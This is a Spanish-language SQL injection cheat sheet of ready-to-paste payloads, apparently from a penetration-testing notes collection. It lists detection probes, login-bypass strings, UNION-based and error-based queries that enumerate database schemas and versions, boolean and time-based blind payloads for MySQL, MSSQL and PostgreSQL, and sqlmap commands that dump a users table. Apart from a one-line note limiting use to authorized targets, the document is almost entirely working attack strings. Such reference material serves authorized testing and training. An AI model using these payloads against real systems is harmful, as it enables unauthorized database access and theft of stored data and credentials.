# Cheatsheet · SQL Injection

Payloads listos para pegar. La explicación está en `../../01-web/injection/sqli.md`.
**Solo sobre objetivos autorizados.**

## Detección

```sql
'                     -- rompe la query (busca error/cambio)
''                    -- repara (si ' rompe y '' no → SQLi)
"                     -- prueba con comilla doble
' OR '1'='1
' AND '1'='2
1 OR 1=1              -- contexto numérico
```

## Comentarios (truncar el resto de la query)

```sql
-- -      #        /* */        ;%00
```

## Bypass de autenticación

```sql
admin'-- -
admin' #
' OR 1=1-- -
' OR '1'='1'-- -
') OR ('1'='1'-- -
```

## Union-based

```sql
' ORDER BY 1-- -          -- incrementa hasta que falle → nº de columnas
' UNION SELECT NULL-- -   -- ajusta NULLs al nº de columnas
' UNION SELECT 1,2,3-- -  -- localiza columnas visibles
' UNION SELECT NULL,version(),NULL-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

## Error-based (MySQL)

```sql
' AND extractvalue(1,concat(0x7e,version()))-- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -
```

## Blind — Boolean

```sql
' AND SUBSTRING((SELECT database()),1,1)='a'-- -
' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -
```

## Blind — Time

```sql
' AND SLEEP(5)-- -                                   -- MySQL
'; WAITFOR DELAY '0:0:5'-- -                          -- MSSQL
' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -               -- PostgreSQL
```

## sqlmap

```bash
# desde una request guardada en Burp (incluye cookies/headers)
sqlmap -r req.txt --batch

# parámetro concreto, subir agresividad
sqlmap -u "https://sitio/item?id=1" -p id --level 5 --risk 3 --batch

# enumerar
sqlmap -r req.txt --dbs
sqlmap -r req.txt -D nombre_bd --tables
sqlmap -r req.txt -D nombre_bd -T users --dump

# con autenticación
sqlmap -u "URL" --cookie="session=..." --batch
```

## Notas

- Adapta comentarios y funciones al motor (MySQL/MSSQL/PostgreSQL/Oracle).
- Si `'` rompe pero no ves salida → prueba blind (boolean/time).
- sqlmap para confirmar/explotar, no para el descubrimiento inicial (hazlo tú a mano primero).
